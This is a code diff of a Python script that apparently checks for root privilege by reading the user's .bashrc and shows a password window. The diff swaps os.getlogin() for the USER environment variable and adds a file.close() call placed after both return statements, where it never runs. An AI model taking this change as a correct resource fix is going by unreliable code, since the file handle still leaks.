@@ -11,7 +11,7 @@ window = password_lbl = password_entry = None
 #call this function if returned true then root privilege gained
 #else : the root privilege failed
 def get_root():
-    file = open("/home/"+os.getlogin()+"/.bashrc", 'r')
+    file = open("/home/"+os.environ.get('USER')+"/.bashrc", 'r')
     lines = file.readlines()
     gotroot = None
     for line in lines:
@@ -23,6 +23,7 @@ def get_root():
         return root_user
     else:
         return None
+    file.close()
 
 def got_root():
     try:
@@ -75,7 +76,7 @@ def cancel_click_handler():
 
 
 def get_username():
-    return os.getlogin()
+    return os.environ.get('USER')
 
 def open_window():
     global window, password_entry, password_lbl, root_user
